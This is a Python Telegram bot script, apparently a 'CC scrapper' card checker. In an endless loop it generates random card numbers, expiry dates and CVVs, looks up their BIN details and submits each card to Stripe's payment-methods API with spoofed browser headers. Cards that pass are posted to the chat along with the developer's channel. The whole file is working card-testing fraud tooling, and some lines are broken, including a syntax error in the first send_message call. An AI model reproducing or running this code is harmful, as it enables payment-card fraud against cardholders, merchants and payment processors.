import requests,user_agent,flask,telebot,random,os,sys
import telebot
from telebot import types
from user_agent import generate_user_agent
import logging
from config import *
from flask import Flask, request

bot = telebot.TeleBot(BOT_TOKEN)
server = Flask(__name__)
logger = telebot.logger
logger.setLevel(logging.DEBUG)

@bot.message_handler(commands=['start'])
def boten(message):
	key = types.InlineKeyboardMarkup()
	b2=types.InlineKeyboardButton(text='CHANEEL', url='https://t.me/Freeintrnn')
	bot.send_message(message.chat.id,'RUN OKAY WAIT HITS'=respo,parse_mode='html',reply_markup=key)
	key.row_width = 1
	key.add(b2)
	bi='4536'
	bb='0987654321'
	ya=['2023','2024','2025','2026','2027','2028','2029']
	ex=['01','02','03','04','05','06','07','08','09','10','11','12']
	while True:
		b1 = random.choice(bi)
		bin = b1+random.choice(bb)+random.choice(bi)+random.choice(bb)+random.choice(bi)+random.choice(bb)
		exy=random.choice(ya)
		exp=random.choice(ex)
		ccv=random.choice(bb)+random.choice(bb)+random.choice(bb)
		cgen=random.choice(bb)+random.choice(bb)+random.choice(bb)+random.choice(bb)+random.choice(bb)+random.choice(bb)+random.choice(bb)+random.choice(bb)+random.choice(bb)+random.choice(bb)
		cn = bin+cgen
		cc = bin+cgen+'|'+exp+'|'+exy+'|'+ccv
		try:
			apibinlist = requests.get("https://lookup.binlist.net/"+bin).json()
			try:
				emoji = apibinlist["country"]["emoji"]
			except:
				emoji=''
			try:
				name = apibinlist["country"]["name"]
			except:
				name=''
			try:
				binType = apibinlist["type"]
			except:
				binType=''
			try:
				bank_name = apibinlist["bank"]["name"]
			except:
				bank_name=''
			try:
				bank_phone = apibinlist["bank"]["phone"]
			except:
				bank_phone=''
			try:
				bank_url = apibinlist["bank"]["url"]
			except:
				bank_url=''
			try:
				brand = apibinlist["brand"]
			except:
				brand=''
			try:
				scheme = apibinlist["scheme"]
			except:
				scheme=''
			url='https://api.stripe.com/v1/payment_methods'
			h={'Host':'api.stripe.com',
'content-length':'396',
'sec-ch-ua':'" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
'accept':'application/json',
'content-type':'application/x-www-form-urlencoded',
'sec-ch-ua-mobile':'?1',
'user-agent':'Mozilla/5.0 (Linux; Android 9; SM-J610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36',
'sec-ch-ua-platform':'"Android"',
'origin':'https://js.stripe.com',
'sec-fetch-site':'same-site',
'sec-fetch-mode':'cors',
'sec-fetch-dest':'empty',
'referer':'https://js.stripe.com/',
'accept-encoding':'gzip, deflate, br',
'accept-language':'ar-AE,ar;q=0.9,en-US;q=0.8,en;q=0.7',}
			d1=f'type=card&card[number]={cn}&card[cvc]={ccv}&card[exp_month]={exp}&card[exp_year]={exy}&guid=789f660e-9df9-4a2f-a762-30cfb520694f32a7a7&muid=af4b39a3-627e-4556-83aa-c6d4f6ee583f44dc48&sid=5092f25a-dc84-4682-a5f3-5729a614df9fb88501&payment_user_agent=stripe.js%2F0d3c53128%3B+stripe-js-v3%2F0d3c53128&time_on_page=97246&key=pk_test_QAdf5s3X1BEW3sakhdhuqpQO&_stripe_account=acct_1GAQrNFOKqtesiOC'
			r = requests.post(url,headers=h,data=d1)
			r = int(r.status_code)
			if r == int(200):
				respo= f"""
┏━━━━━━━━━━━━━━
┣ 🍂 𝑪𝑪 𝑺𝑺𝑪𝑹𝑨𝑷𝑷𝑬𝑹 🍂 ┗━━━━━━━━━━━━━━
════════════════════                   ╠𝑪𝑪: {cc}
┏━━━━━━━━━━━━━━
┣ 🍁 𝑩𝑰𝑵 {bin} 𝑫𝑨𝑻𝑨 🍁
┗━━━━━━━━━━━━━━
╠𝑩𝒊𝒏 𝑫𝒆𝒕𝒂𝒊𝒍𝒔:{name} -{emoji} -{bank_name}{binType} -{scheme}
╠𝑩𝒂𝒏𝒌: {brand}
┏━━━━━━━━━━━━━━
┣ 🍁 𝑀𝑌 𝐼𝑁𝐹𝑂 🍁
┗━━━━━━━━━━━━━━
🧑🏻‍💻| 𝑫𝐸𝑉:  @Mosalahxyz 
🥷🏻| 𝑪𝑯:@Freeintrnn """
				bot.send_message(message.chat.id,text=respo,parse_mode='html',reply_markup=key)
			else:
				pass
			
		except:pass
		
@server.route(f"/{BOT_TOKEN}", methods=["POST"])
def redirect_message():
    json_string = request.get_data().decode("utf-8")
    update = telebot.types.Update.de_json(json_string)
    bot.process_new_updates([update])
    return "!", 200

if __name__ == "__main__":
    bot.remove_webhook()
    bot.set_webhook(url="https://tgbbbit.herokuapp.com/"+str(BOT_TOKEN))
    server.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
